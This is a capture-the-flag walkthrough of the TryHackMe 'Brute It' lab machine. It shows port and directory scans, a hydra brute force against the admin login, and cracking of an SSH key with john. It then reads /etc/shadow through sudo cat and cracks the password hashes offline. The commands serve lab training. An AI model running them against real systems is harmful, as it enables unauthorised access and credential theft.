# Brute It

**Room Link:** [https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid" -V
```

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
chmod 600 id_rsa 
ssh -i id_rsa john@$VICTIM
pass: rockinroll
```



john can run cat as root, we can just use this to read root.txt but I decided to read the shadow file which I can't do from johns account, then send shadow and passwd files back to Kali to crack.

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -l
LFILE=/etc/shadow
sudo cat "$LFILE"
```

**Kali**

```
unshadow passwd shadow > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>











